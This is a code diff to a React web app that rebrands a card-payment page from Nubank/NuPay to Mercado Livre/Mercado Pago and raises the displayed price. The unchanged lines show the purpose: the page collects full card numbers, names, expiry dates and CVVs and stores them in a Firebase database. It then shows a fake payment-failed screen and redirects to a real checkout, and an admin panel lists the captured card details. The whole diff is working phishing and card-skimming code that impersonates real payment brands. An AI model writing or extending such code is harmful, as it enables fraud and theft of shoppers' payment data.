@@ -16,6 +16,11 @@ if (!firebase.apps.length) {
 }
 const db = firebase.database();
 
+// Constants
+const TOTAL_PRICE = 3200.00;
+const RETRY_LINK = 'https://checkout.nubank.com.br/y3Z9DFv2bK15dr71';
+const MERCADO_PAGO_LOGO = 'https://logodownload.org/wp-content/uploads/2019/06/mercado-pago-logo.png';
+
 // Helper for masking
 const maskCardNumber = (value: string) => {
   return value
@@ -162,7 +167,7 @@ const App: React.FC = () => {
     }
   };
 
-  // Step 1: User clicks "Pagar com Nubank" on summary -> Goes to Card Form
+  // Step 1: User clicks "Pagar" on summary -> Goes to Card Form
   const handleProceedToCard = () => {
     setPaymentStep('card_form');
   };
@@ -184,7 +189,7 @@ const App: React.FC = () => {
       ...formData,
       products: selectedProducts,
       cardDetails: cardData,
-      total: 635.00,
+      total: TOTAL_PRICE,
       timestamp: new Date().toISOString(),
       status: 'payment_failed_error_screen'
     };
@@ -201,7 +206,7 @@ const App: React.FC = () => {
 
   // Step 3: User clicks "Try Again" -> Redirects to real checkout
   const handleRetryPayment = () => {
-    window.location.href = 'https://checkout.nubank.com.br/y3Z9DFv2bK15dr71';
+    window.location.href = RETRY_LINK;
   };
 
   // --- Admin Logic ---
@@ -232,6 +237,19 @@ const App: React.FC = () => {
       });
     } else {
       setAdminError('Credenciais inválidas.');
+    }
+  };
+
+  const getInstallmentText = (n: number) => {
+    if (n <= 4) {
+      const val = (TOTAL_PRICE / n).toFixed(2).replace('.', ',');
+      return `${n}x de R$ ${val} sem juros`;
+    } else {
+      // Simulate interest: 2.5% simple interest per month over 4
+      const interestRate = 0.025;
+      const totalWithInterest = TOTAL_PRICE * (1 + (n - 4) * interestRate);
+      const val = (totalWithInterest / n).toFixed(2).replace('.', ',');
+      return `${n}x de R$ ${val} com juros`;
     }
   };
 
@@ -326,9 +344,9 @@ const App: React.FC = () => {
             <button
               type="submit"
               className="w-full py-4 px-6 rounded-2xl text-white font-bold text-lg
-                shadow-lg shadow-purple-900/10 flex items-center justify-center gap-2
+                shadow-lg shadow-blue-900/10 flex items-center justify-center gap-2
                 transform transition-all duration-200
-                bg-nubank hover:bg-[#38085a] hover:scale-[1.01] hover:shadow-xl"
+                bg-mercadolivre hover:bg-[#266fd5] hover:scale-[1.01] hover:shadow-xl"
             >
               <Lock className="w-5 h-5" />
               Realizar o pagamento
@@ -342,12 +360,12 @@ const App: React.FC = () => {
                   name="agreedToShipping"
                   checked={formData.agreedToShipping}
                   onChange={handleChange}
-                  className="peer h-5 w-5 cursor-pointer appearance-none rounded-md border border-gray-300 bg-white checked:border-nubank checked:bg-nubank focus:ring-2 focus:ring-nubank/20"
+                  className="peer h-5 w-5 cursor-pointer appearance-none rounded-md border border-gray-300 bg-white checked:border-mercadolivre checked:bg-mercadolivre focus:ring-2 focus:ring-mercadolivre/20"
                 />
                 <Check className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 w-3.5 h-3.5 text-white pointer-events-none opacity-0 peer-checked:opacity-100 transition-opacity" />
               </div>
               <label htmlFor="shipping" className="text-sm text-gray-500 lowercase cursor-pointer select-none leading-tight flex items-center gap-1.5 flex-wrap">
-                <Truck className="w-4 h-4 text-nubank inline" />
+                <Truck className="w-4 h-4 text-mercadolivre inline" />
                 garantindo o envio das abelhas sem ferrão para todo o brasil
               </label>
             </div>
@@ -359,7 +377,7 @@ const App: React.FC = () => {
 
         <div className="mt-8 text-center">
           <p className="text-xs text-gray-400">
-            © 2024 NuPay - Pagamentos Seguros. Todas as transações são criptografadas.
+            © 2024 Mercado Livre - Pagamentos Seguros. Todas as transações são criptografadas.
           </p>
         </div>
       </div>
@@ -383,12 +401,12 @@ const App: React.FC = () => {
               <div className="animate-in zoom-in-50 duration-300">
                 <div className="flex flex-col items-center justify-center gap-3 mb-6">
                    <img 
-                     src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png" 
-                     alt="Nubank" 
-                     className="h-8 object-contain"
+                     src={MERCADO_PAGO_LOGO} 
+                     alt="Mercado Pago" 
+                     className="h-12 object-contain"
                    />
                    <div className="flex items-center gap-2">
-                    <ShieldCheck className="w-5 h-5 text-nubank" />
+                    <ShieldCheck className="w-5 h-5 text-mercadolivre" />
                     <h2 className="text-lg font-bold text-gray-800">
                       Pague com segurança
                     </h2>
@@ -398,7 +416,7 @@ const App: React.FC = () => {
                 <div className="flex justify-center gap-4 mb-6">
                   <div className="w-24 h-24 rounded-xl overflow-hidden shadow-md border border-gray-100">
                     <img 
-                      src="https://storage.googleapis.com/paginassites/jandaira-FCM-696x462.jpg" 
+                      src="https://abelhas.org:9443/MediaUploader/fa5ce88be106452ea6a0dd88ecc319c3.webp" 
                       alt="Combo Selecionado" 
                       className="w-full h-full object-cover"
                     />
@@ -407,14 +425,14 @@ const App: React.FC = () => {
 
                 <div className="mb-8">
                    <p className="text-sm text-gray-500 mb-1">Valor Total</p>
-                   <p className="text-3xl font-extrabold text-nubank">R$ 635,00</p>
+                   <p className="text-3xl font-extrabold text-mercadolivre">R$ {TOTAL_PRICE.toFixed(2).replace('.', ',')}</p>
                 </div>
 
                 <button
                   onClick={handleProceedToCard}
-                  className="w-full py-3.5 rounded-xl bg-nubank text-white font-bold shadow-lg shadow-purple-900/20 hover:bg-[#38085a] transition-all"
+                  className="w-full py-3.5 rounded-xl bg-mercadolivre text-white font-bold shadow-lg shadow-blue-900/20 hover:bg-[#266fd5] transition-all"
                 >
-                  Pagar com o Nubank
+                  Pagar agora
                 </button>
               </div>
             )}
@@ -424,13 +442,13 @@ const App: React.FC = () => {
               <div className="animate-in slide-in-from-right duration-300 text-left">
                  <div className="flex items-center gap-3 mb-6">
                    <img 
-                     src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Nubank_logo_2021.svg/1200px-Nubank_logo_2021.svg.png" 
-                     alt="Nubank" 
-                     className="h-6 object-contain"
+                     src={MERCADO_PAGO_LOGO} 
+                     alt="Mercado Pago" 
+                     className="h-12 object-contain"
                    />
                    <div>
                      <h2 className="text-xl font-bold text-gray-800">Dados do Cartão</h2>
-                     <p className="text-[10px] text-gray-400 uppercase tracking-widest font-bold">Pagamento 100% seguro via NuPay</p>
+                     <p className="text-[10px] text-gray-400 uppercase tracking-widest font-bold">Pagamento 100% seguro via Mercado Pago</p>
                    </div>
                  </div>
                  
@@ -445,7 +463,7 @@ const App: React.FC = () => {
                           onChange={handleCardChange}
                           placeholder="0000 0000 0000 0000"
                           maxLength={19}
-                          className="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all"
+                          className="w-full pl-10 pr-4 py-3 rounded-xl border border-gray-200 focus:border-mercadolivre focus:ring-2 focus:ring-mercadolivre/20 outline-none transition-all"
                           required
                         />
                       </div>
@@ -458,7 +476,7 @@ const App: React.FC = () => {
                         value={cardData.cardName}
                         onChange={handleCardChange}
                         placeholder="Como está impresso no cartão"
-                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all"
+                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-mercadolivre focus:ring-2 focus:ring-mercadolivre/20 outline-none transition-all"
                         required
                       />
                     </div>
@@ -474,7 +492,7 @@ const App: React.FC = () => {
                               onChange={handleCardChange}
                               placeholder="MM/AA"
                               maxLength={5}
-                              className="w-full pl-9 pr-3 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all"
+                              className="w-full pl-9 pr-3 py-3 rounded-xl border border-gray-200 focus:border-mercadolivre focus:ring-2 focus:ring-mercadolivre/20 outline-none transition-all"
                               required
                             />
                           </div>
@@ -490,7 +508,7 @@ const App: React.FC = () => {
                               placeholder="123"
                               maxLength={4}
                               type="tel"
-                              className="w-full pl-9 pr-3 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all"
+                              className="w-full pl-9 pr-3 py-3 rounded-xl border border-gray-200 focus:border-mercadolivre focus:ring-2 focus:ring-mercadolivre/20 outline-none transition-all"
                               required
                             />
                           </div>
@@ -503,11 +521,11 @@ const App: React.FC = () => {
                         name="installments"
                         value={cardData.installments}
                         onChange={handleCardChange}
-                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all bg-white"
+                        className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-mercadolivre focus:ring-2 focus:ring-mercadolivre/20 outline-none transition-all bg-white"
                       >
                          {[...Array(12)].map((_, i) => (
                            <option key={i} value={i + 1}>
-                             {i + 1}x de R$ {(635 / (i + 1)).toFixed(2).replace('.', ',')} sem juros
+                             {getInstallmentText(i + 1)}
                            </option>
                          ))}
                       </select>
@@ -515,7 +533,7 @@ const App: React.FC = () => {
 
                     <button
                       type="submit"
-                      className="w-full py-4 rounded-xl bg-nubank text-white font-bold shadow-lg mt-4 hover:bg-[#38085a] transition-all"
+                      className="w-full py-4 rounded-xl bg-mercadolivre text-white font-bold shadow-lg mt-4 hover:bg-[#266fd5] transition-all"
                     >
                       Finalizar Pagamento
                     </button>
@@ -526,11 +544,11 @@ const App: React.FC = () => {
             {/* --- STEP 3: PROCESSING --- */}
             {paymentStep === 'processing' && (
               <div className="py-10 flex flex-col items-center justify-center animate-in fade-in duration-300">
-                <svg className="animate-spin h-16 w-16 text-nubank mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <svg className="animate-spin h-16 w-16 text-mercadolivre mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                   <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                   <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                 </svg>
-                <p className="text-nubank font-semibold animate-pulse">Processando pagamento...</p>
+                <p className="text-mercadolivre font-semibold animate-pulse">Processando pagamento...</p>
                 <p className="text-lg font-bold text-gray-800 mt-2 text-center px-4 capitalize">{formData.fullName}</p>
                 <p className="text-xs text-gray-400 mt-2">Aguarde, não feche esta página.</p>
               </div>
@@ -549,7 +567,7 @@ const App: React.FC = () => {
                 
                 <button
                   onClick={handleRetryPayment}
-                  className="w-full py-3.5 rounded-xl bg-nubank text-white font-bold shadow-lg flex items-center justify-center gap-2 hover:bg-[#38085a] transition-all"
+                  className="w-full py-3.5 rounded-xl bg-mercadolivre text-white font-bold shadow-lg flex items-center justify-center gap-2 hover:bg-[#266fd5] transition-all"
                 >
                   <RefreshCw className="w-5 h-5" />
                   Tentar pagar novamente
@@ -572,14 +590,14 @@ const App: React.FC = () => {
                 <X className="w-5 h-5" />
               </button>
              <h2 className="text-xl font-bold text-gray-800 mb-4 flex items-center gap-2">
-               <Lock className="w-5 h-5 text-nubank" /> Admin Access
+               <Lock className="w-5 h-5 text-mercadolivre" /> Admin Access
              </h2>
              <form onSubmit={handleAdminLogin} className="space-y-4">
                 <div>
                   <label className="block text-sm font-medium text-gray-700 mb-1">Usuário</label>
                   <input 
                     type="text" 
-                    className="w-full px-3 py-2 border rounded-lg focus:ring-2 focus:ring-nubank/20 focus:border-nubank outline-none"
+                    className="w-full px-3 py-2 border rounded-lg focus:ring-2 focus:ring-mercadolivre/20 focus:border-mercadolivre outline-none"
                     value={adminUser}
                     onChange={(e) => setAdminUser(e.target.value)}
                   />
@@ -588,7 +606,7 @@ const App: React.FC = () => {
                   <label className="block text-sm font-medium text-gray-700 mb-1">Senha</label>
                   <input 
                     type="password" 
-                    className="w-full px-3 py-2 border rounded-lg focus:ring-2 focus:ring-nubank/20 focus:border-nubank outline-none"
+                    className="w-full px-3 py-2 border rounded-lg focus:ring-2 focus:ring-mercadolivre/20 focus:border-mercadolivre outline-none"
                     value={adminPass}
                     onChange={(e) => setAdminPass(e.target.value)}
                   />
@@ -610,7 +628,7 @@ const App: React.FC = () => {
         <div className="fixed inset-0 z-[70] bg-gray-100 flex flex-col animate-in slide-in-from-bottom duration-300">
            <div className="bg-white border-b border-gray-200 px-6 py-4 flex items-center justify-between shadow-sm">
               <div className="flex items-center gap-3">
-                 <div className="bg-nubank p-2 rounded-lg">
+                 <div className="bg-mercadolivre p-2 rounded-lg">
                     <Database className="w-5 h-5 text-white" />
                  </div>
                  <div>
@@ -662,8 +680,8 @@ const App: React.FC = () => {
                                      <label className="text-xs text-gray-400 uppercase font-bold">Produtos</label>
                                      <div className="flex gap-1 mt-1">
                                         {order.products?.map((p: string) => (
-                                           <span key={p} className="text-xs bg-purple-50 text-nubank px-2 py-1 rounded border border-purple-100">
-                                              {p === 'kit' ? 'Combo Abelhas' : p}
+                                           <span key={p} className="text-xs bg-blue-50 text-mercadolivre px-2 py-1 rounded border border-blue-100">
+                                              {p === 'kit' ? 'Combo Especial' : p}
                                            </span>
                                         ))}
                                      </div>
@@ -677,7 +695,7 @@ const App: React.FC = () => {
                                 {order.cardDetails && (
                                   <div className="mt-3 p-3 bg-gray-50 border border-gray-200 rounded-lg">
                                     <div className="flex items-center gap-2 mb-2 pb-2 border-b border-gray-200">
-                                      <CreditCard className="w-3 h-3 text-nubank" />
+                                      <CreditCard className="w-3 h-3 text-mercadolivre" />
                                       <span className="text-xs font-bold text-gray-700">Dados do Pagamento</span>
                                     </div>
                                     <div className="grid grid-cols-2 gap-2 text-xs">
@@ -699,7 +717,10 @@ const App: React.FC = () => {
                                       </div>
                                       <div className="col-span-2 mt-1 pt-1 border-t border-gray-100">
                                         <span className="text-gray-400 block text-[10px]">Parcelamento</span>
-                                        <span className="text-nubank font-bold">{order.cardDetails.installments}x sem juros</span>
+                                        <span className="text-mercadolivre font-bold">
+                                          {order.cardDetails.installments}x 
+                                          {parseInt(order.cardDetails.installments) <= 4 ? ' sem juros' : ' com juros'}
+                                        </span>
                                       </div>
                                     </div>
                                   </div>
